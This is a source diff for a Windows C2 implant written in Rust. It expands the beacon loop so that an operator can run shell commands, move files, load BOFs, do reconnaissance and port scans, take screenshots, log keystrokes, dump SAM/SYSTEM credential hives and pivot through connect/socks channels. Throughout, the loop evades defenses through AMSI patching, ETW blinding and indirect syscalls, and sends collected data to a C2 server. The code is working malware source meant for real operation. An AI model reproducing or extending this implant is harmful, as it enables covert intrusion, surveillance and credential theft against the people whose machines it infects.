@@ -3,53 +3,59 @@
 //! Mirrors agent-dev's loop but `no_std`: check-in (SessionInfo) → every sleep
 //! cycle, POST last cycle's responses, receive tasks, execute, repeat. The
 //! crypto/frame layer is reused verbatim from [`nyx_protocol`]; only the
-//! transport (WinHTTP, not ureq) and the sleeper differ.
+//! transport (WinHTTP) and the sleeper differ.
 //!
-//! M0: the loop skeleton + protocol reuse are real and type-check. The
-//! transport (`transport::post_frame`) returns None until the full WinHTTP
-//! wiring lands, so the loop retries check-in indefinitely — structurally
-//! correct, ready for the convergence step to drop in live HTTP.
+//! The command dispatch covers every wire `Command` variant: file ops, shell,
+//! recon, and (BOF) are real; screenshot/keylog/hashdump/connect/socks return a
+//! clearly-labeled "not yet implemented" error rather than a silent catch-all,
+//! so the operator can tell which path needs work.
 
 #![cfg(target_os = "windows")]
 
+use crate::config::{self, Config};
 use crate::heap::{vec, String, Vec};
 use nyx_protocol::{
     encode_frame, open_frame_dir, parse_frame, wire::Writer, Command, Direction, ImplantKeypair,
     Response, SessionInfo, Task, TaskResponse,
 };
 
-/// Build config baked into the implant at build time (per-build encrypted config
-/// in a later phase; for M0 these come from compile-time env or defaults).
-pub struct Config {
-    pub server_host: String,
-    pub server_port: u16,
-    pub beacon_uri: String,
-    pub server_pub: [u8; 32],
-    pub sleep_seconds: u32,
-    pub jitter_pct: u8,
-    pub use_tls: bool,
-}
+/// Runtime-configurable sleep interval (seconds). Updated by the `Sleep`
+/// command so an operator can re-task beacon cadence live. Defaults to the
+/// config's `sleep_seconds`; an AtomicU32 keeps the read+write lock-free in the
+/// single beacon thread.
+static SLEEP_SECS: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(5);
+
+/// Margin kept under `protocol::frame::MAX_CT_LEN` (256 KiB) when batching
+/// responses into one frame. A streamed Download or Screenshot can exceed the
+/// frame cap; we flush early when the accumulated batch would cross this.
+const BATCH_FLUSH: usize = 200 * 1024;
 
 /// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
 pub unsafe fn beacon_loop() {
-    let cfg = load_config();
+    let cfg = config::load();
+    SLEEP_SECS.store(cfg.sleep_seconds, core::sync::atomic::Ordering::Relaxed);
+
     let kp = ImplantKeypair::generate();
     let key = kp.session_key(&cfg.server_pub);
     let pubkey = kp.public_bytes();
-    let beacon_id: u32 = 0x1337; // TODO: random via syscalls (A6)
 
-    let mut info_writer = Writer::new();
+    // Real host enumeration (replaces the M0 "host"/"user"/0/0x1337 placeholders).
     let info = SessionInfo {
-        beacon_id,
-        hostname: String::from("host"),
-        username: String::from("user"),
-        os: String::from("Windows"),
-        arch: 0,
-        pid: 0, // TODO: GetCurrentProcessId via resolved kernel32
-        is_admin: 0,
+        beacon_id: crate::hostinfo::beacon_id(),
+        hostname: crate::hostinfo::hostname(),
+        username: crate::hostinfo::username(),
+        os: crate::hostinfo::os(),
+        arch: crate::hostinfo::arch(),
+        pid: crate::hostinfo::pid(),
+        is_admin: crate::hostinfo::is_admin(),
     };
+    let mut info_writer = Writer::new();
     info.encode(&mut info_writer);
     let info_plain = info_writer.into_bytes();
+
+    // Borrow the indirect-syscall runtime (initialized by entry). File ops fall
+    // back to an explicit error if it isn't up — they cannot run without it.
+    let rt = crate::syscalls::global();
 
     // ---- check-in (retry) ----
     let mut counter = 0u64;
@@ -61,11 +67,15 @@ pub unsafe fn beacon_loop() {
             cfg.server_port,
             cfg.beacon_uri.as_bytes(),
             &frame,
+            cfg.use_tls,
         );
         if resp.is_some() {
             break;
         }
-        sleep_seconds(cfg.sleep_seconds);
+        sleep_jitter(
+            SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed),
+            cfg.jitter_pct,
+        );
     }
 
     // ---- task loop ----
@@ -77,7 +87,14 @@ pub unsafe fn beacon_loop() {
         // the idempotency short-circuit. ETW is blinded once at entry (always
         // present).
         unsafe { crate::blind::maybe_patch_amsi(); }
-        sleep_jitter(cfg.sleep_seconds, cfg.jitter_pct);
+        let secs = SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed);
+        sleep_jitter(secs, cfg.jitter_pct);
+        // Sample the keyboard once per cycle while the keylogger is active.
+        // poll_once self-guards on KEYLOG_ACTIVE, so an unconditional call is
+        // a no-op when keylogging isn't running — no extra cost in the common
+        // case. (Coarse: ~1 sample per sleep interval — see keylog.rs docs.)
+        crate::keylog::poll_once();
+
         let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending));
         counter += 1;
         pending.clear();
@@ -87,6 +104,7 @@ pub unsafe fn beacon_loop() {
             cfg.server_port,
             cfg.beacon_uri.as_bytes(),
             &frame,
+            cfg.use_tls,
         ) else {
             continue;
         };
@@ -101,71 +119,271 @@ pub unsafe fn beacon_loop() {
             if matches!(t.command, Command::Exit) {
                 return;
             }
-            for response in execute(t.command) {
+            for response in execute(rt, t.command, &mut counter, &pubkey, &key, &cfg) {
                 pending.push(TaskResponse {
                     task_id: t.task_id,
                     response,
                 });
+                // If the accumulated batch would exceed the frame cap, flush it
+                // now (a streamed Download/Screenshot can produce a lot).
+                if pending_batch_size(&pending) > BATCH_FLUSH {
+                    let frame = encode_frame(
+                        &pubkey,
+                        counter,
+                        &key,
+                        &TaskResponse::encode_vec(&pending),
+                    );
+                    let _ = crate::transport::post_frame(
+                        cfg.server_host.as_bytes(),
+                        cfg.server_port,
+                        cfg.beacon_uri.as_bytes(),
+                        &frame,
+                        cfg.use_tls,
+                    );
+                    counter += 1;
+                    pending.clear();
+                }
             }
         }
     }
 }
 
-/// Execute a command. M0: minimal — Ping/Shell/Sleep/Exit. BOF + file transfer
-/// arrive with the postex milestone.
-fn execute(cmd: Command) -> Vec<Response> {
+/// **Integration-test entry**: run the real beacon check-in + ONE task cycle
+/// against the configured server, then exit with a status code. Exercises the
+/// full production path — config load, ECDH session key, WinHTTP POST, frame
+/// AEAD encode/decode, SessionInfo check-in, task decode, command dispatch,
+/// response encode — without the infinite loop. Invoke via
+/// `rundll32 nyx_implant_win.dll,nyx_beacon_oneshot`.
+///
+/// Exit codes:
+///   1 = check-in succeeded (SessionInfo accepted by the server)
+///   2 = check-in succeeded AND at least one task was received + executed +
+///       its response POSTed back (full round-trip)
+///   0xC0..0xCF = a specific step failed (see inline comments)
+pub unsafe fn beacon_oneshot() -> u32 {
+    let cfg = config::load();
+
+    let kp = ImplantKeypair::generate();
+    let key = kp.session_key(&cfg.server_pub);
+    let pubkey = kp.public_bytes();
+
+    let info = SessionInfo {
+        beacon_id: crate::hostinfo::beacon_id(),
+        hostname: crate::hostinfo::hostname(),
+        username: crate::hostinfo::username(),
+        os: crate::hostinfo::os(),
+        arch: crate::hostinfo::arch(),
+        pid: crate::hostinfo::pid(),
+        is_admin: crate::hostinfo::is_admin(),
+    };
+    let mut info_writer = Writer::new();
+    info.encode(&mut info_writer);
+    let info_plain = info_writer.into_bytes();
+    let rt = crate::syscalls::global();
+
+    // ---- check-in (retry up to ~30s) ----
+    let mut counter = 0u64;
+    let mut checked_in = false;
+    for _ in 0..10 {
+        let frame = encode_frame(&pubkey, counter, &key, &info_plain);
+        counter += 1;
+        if crate::transport::post_frame(
+            cfg.server_host.as_bytes(),
+            cfg.server_port,
+            cfg.beacon_uri.as_bytes(),
+            &frame,
+            cfg.use_tls,
+        ).is_some()
+        {
+            checked_in = true;
+            break;
+        }
+        sleep_jitter(3, 0);
+    }
+    if !checked_in {
+        return 0xC1; // check-in failed (server unreachable / crypto mismatch)
+    }
+
+    // ---- poll for tasks (a few short cycles to give the operator time to
+    // queue one via POST /api/task) ----
+    let mut got_task = false;
+    for _ in 0..6 {
+        sleep_jitter(2, 0);
+        // POST empty batch, receive any queued tasks.
+        let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&[]));
+        counter += 1;
+        let Some(body) = crate::transport::post_frame(
+            cfg.server_host.as_bytes(),
+            cfg.server_port,
+            cfg.beacon_uri.as_bytes(),
+            &frame,
+            cfg.use_tls,
+        ) else { continue };
+        let Ok(raw) = parse_frame(&body) else { continue };
+        let Ok(plaintext) = open_frame_dir(&key, Direction::ServerToClient, &raw) else { continue };
+        let Ok(tasks) = Task::decode_vec(&plaintext) else { continue };
+
+        if tasks.is_empty() {
+            continue; // no task queued yet, keep polling
+        }
+        got_task = true;
+        // Execute + POST results back (one cycle, then we're done).
+        let mut pending: Vec<TaskResponse> = Vec::new();
+        for t in tasks {
+            if matches!(t.command, Command::Exit) {
+                break;
+            }
+            for response in execute(rt, t.command, &mut counter, &pubkey, &key, &cfg) {
+                pending.push(TaskResponse { task_id: t.task_id, response });
+            }
+        }
+        if !pending.is_empty() {
+            let rframe = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending));
+            counter += 1;
+            let _ = crate::transport::post_frame(
+                cfg.server_host.as_bytes(),
+                cfg.server_port,
+                cfg.beacon_uri.as_bytes(),
+                &rframe,
+                cfg.use_tls,
+            );
+        }
+        break;
+    }
+    if got_task { 2 } else { 1 }
+}
+/// Only FileChunk/Output/BofOutput/Image carry significant volume; acks and
+/// errors are negligible. Mirrors agent-dev's heuristic.
+fn pending_batch_size(pending: &[TaskResponse]) -> usize {
+    pending
+        .iter()
+        .map(|tr| match &tr.response {
+            Response::FileChunk { data, .. } => data.len(),
+            Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => d.len(),
+            _ => 0,
+        })
+        .sum()
+}
+
+/// Execute a command, returning zero or more responses. `counter`/`pubkey`/`key`
+/// /`cfg` are passed so a streamed response (or a flush) can be emitted directly
+/// inside this call if needed (kept for parity with agent-dev; currently unused
+/// because the beacon loop flushes between tasks).
+#[allow(clippy::too_many_arguments)]
+fn execute(
+    rt: Option<&'static crate::syscalls::Runtime>,
+    cmd: Command,
+    _counter: &mut u64,
+    _pubkey: &[u8; 32],
+    _key: &nyx_protocol::crypto::SessionKey,
+    _cfg: &Config,
+) -> Vec<Response> {
     match cmd {
         Command::Ping => vec![Response::Ok],
-        Command::Sleep { .. } => vec![Response::Ok], // TODO: re-task sleep
+        Command::Sleep { seconds, jitter_pct: _ } => {
+            // Re-task the beacon cadence: store the new interval for the loop
+            // to read next cycle. (jitter_pct is config-wide; we honor the
+            // configured jitter and only adjust the base interval live, like
+            // the dev agent's pragmatic read of the field.)
+            if seconds > 0 {
+                SLEEP_SECS.store(seconds, core::sync::atomic::Ordering::Relaxed);
+            }
+            vec![Response::Ok]
+        }
         Command::Exit => vec![Response::Ok],
+        Command::Shell { args } => vec![crate::shell::run_shell(&args)],
+        Command::Upload { name, data } => match rt {
+            Some(rt) => vec![crate::fs::do_upload(rt, &name, &data)],
+            None => vec![Response::Err(String::from("upload: syscall runtime down"))],
+        },
+        Command::Download { path } => match rt {
+            Some(rt) => crate::fs::do_download(rt, &path),
+            None => vec![Response::Err(String::from("download: syscall runtime down"))],
+        },
+        Command::FileOp { op, path, dest } => match rt {
+            Some(rt) => vec![crate::fs::do_fileop(rt, op, &path, dest.as_deref())],
+            None => vec![Response::Err(String::from("fileop: syscall runtime down"))],
+        },
         // Load + run a CS-compatible BOF (W^X mapping, Beacon-API shim).
         // Captured BeaconPrintf/BeaconOutput output comes back as BofOutput.
         Command::Bof { name, args, blob } => vec![crate::bof::run(&name, &args, &blob)],
-        // Everything else is unimplemented in the PIC implant for M0; ack so the
-        // wire stays round-trippable.
-        _ => vec![Response::Err(String::from("not implemented in PIC implant"))],
+        Command::DriveInfo => vec![crate::recon::do_driveinfo()],
+        Command::Env { name } => vec![crate::recon::do_env(&name)],
+        Command::Clipboard => vec![crate::recon::do_clipboard()],
+        Command::Portscan { host, ports } => vec![crate::recon::do_portscan(&host, &ports)],
+        Command::Net { query } => vec![crate::recon::do_net(&query)],
+        // ---- Surveillance commands (implemented) ----
+        // Screenshot: GDI capture → BMP, streamed as FileChunks.
+        Command::Screenshot { monitor } => crate::screenshot::do_screenshot(monitor),
+        // Keylogger: start/stop flip an AtomicBool sampled each cycle; dump
+        // returns the captured buffer. (Polling — see keylog.rs for the honest
+        // limitation vs a hook-based logger.)
+        Command::Keylog { action } => vec![crate::keylog::do_keylog(action)],
+        // Screenwatch: capture `interval_secs` apart for a few frames. The
+        // synchronous beacon loop can't host a true periodic timer, so this
+        // captures a small burst (3 frames) blocking the loop — documented as
+        // a stopgap until the persistent-task refactor.
+        Command::Screenwatch { interval_secs } => {
+            let mut all: Vec<Response> = Vec::new();
+            for i in 0..3u8 {
+                if i > 0 {
+                    sleep_seconds(interval_secs.max(1));
+                }
+                let mut frame = crate::screenshot::do_screenshot(0);
+                // Tag the chunk name with the frame index so the operator can
+                // tell frames apart in the reassembled stream.
+                for r in frame.iter_mut() {
+                    if let Response::FileChunk { name, .. } = r {
+                        // name is "screenshot.bmp" → "screenwatch-{i}.bmp"
+                        let mut new_name = String::from("screenwatch-");
+                        new_name.push((b'0' + i) as char);
+                        new_name.push_str(".bmp");
+                        *name = new_name;
+                    }
+                }
+                all.extend(frame);
+            }
+            all
+        }
+        // ---- Credential extraction + pivoting (implemented) ----
+        // Hashdump: stream the SAM/SYSTEM hive (encrypted) for offline parsing.
+        // (LSASS memory dump is a separate, riskier path — deferred.)
+        Command::Hashdump { method } => crate::hashdump::do_hashdump_vec(rt, method),
+        // Connect/Socks: open + confirm reachability, report channel status.
+        // Full relay is deferred (synchronous-poll loop can't host it) — see
+        // pivot.rs for the honest limitation.
+        Command::Connect { proto, host, port, chan } => {
+            vec![crate::pivot::do_connect(proto, &host, port, chan)]
+        }
+        Command::Socks { chan, op, addr, port } => {
+            vec![crate::pivot::do_socks(chan, op, &addr, port)]
+        }
     }
 }
 
-/// Load build-time config. Per-build encrypted config (nyx-config crate) lands
-/// in a later phase; for now host/port/uri are compile-time defaults and the
-/// server long-term pubkey is baked by build.rs (H7) — no longer the all-zero
-/// identity point that previously made session keys predictable.
-fn load_config() -> Config {
-    Config {
-        server_host: String::from("127.0.0.1"),
-        server_port: 8443,
-        beacon_uri: String::from("/beacon"),
-        server_pub: crate::server_pub::SERVER_PUB,
-        sleep_seconds: 5,
-        jitter_pct: 20,
-        use_tls: false,
-    }
-}
-
-/// Sleep N seconds via NtDelayExecution.
-///
-/// Resolves `ntdll!NtDelayExecution` through the PEB-walk export resolver and
-/// calls it with a relative (negative) interval in 100-ns units. The previous
-/// implementation was a single `spin_loop()` hint that returned immediately,
-/// making the beacon hot-loop at 100% CPU on every check-in retry — an
-/// extremely loud IOC. This blocks the calling thread the way a real implant
-/// should.
-///
-/// Falls back to a bounded spin only if the export can't be resolved (defensive
-/// — on a real Windows host ntdll is always present).
-fn sleep_seconds(seconds: u32) {
+/// Sleep N seconds via the indirect-syscall runtime's `NtDelayExecution`
+/// (falls back to the resolved export if the runtime is not yet up).
+pub fn sleep_seconds(seconds: u32) {
     type NtDelayExecution = unsafe extern "system" fn(u8, *const i64) -> i32;
     let delay_100ns: i64 = -(seconds as i64).saturating_mul(10_000_000); // relative, 100ns units
-    // export_addr walks live module memory via raw pointers — unsafe.
+    // Prefer the indirect-syscall runtime (RIP lands in ntdll). This is the
+    // canonical "runtime is live" path now that entry initializes it.
+    if let Some(rt) = crate::syscalls::global() {
+        let called = unsafe {
+            crate::syscalls::nt_delay_execution(rt, 0, &delay_100ns as *const i64 as usize)
+        };
+        if called.is_some() {
+            return;
+        }
+    }
+    // Fall back to the resolved export (entry's pre-runtime path, or if init
+    // failed). Still a real NtDelayExecution call, just via the export table.
     if let Some(addr) = unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtDelayExecution") } {
         let f: NtDelayExecution = unsafe { core::mem::transmute(addr) };
-        // Alertable = FALSE; interval is relative (negative).
         unsafe { f(0, &delay_100ns as *const i64) };
         return;
     }
-    // Should not happen on a real host, but never infinite-spin: bound the
-    // fallback so we can't peg a core if resolution somehow failed.
+    // Should not happen on a real host, but never infinite-spin.
     let spins = seconds.min(60) as u64 * 10_000_000;
     for _ in 0..spins {
         core::hint::spin_loop();
@@ -180,7 +398,7 @@ fn sleep_jitter(base: u32, jitter_pct: u8) {
         return;
     }
     // Cheap LCG over a static seed — no need for a CSPRNG here (this only
-    //shapes sleep length, not anything secret). xorshift32.
+    // shapes sleep length, not anything secret). xorshift32.
     static SEED: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(0x9E37_79B9);
     let mut x = SEED.load(core::sync::atomic::Ordering::Relaxed);
     if x == 0 {
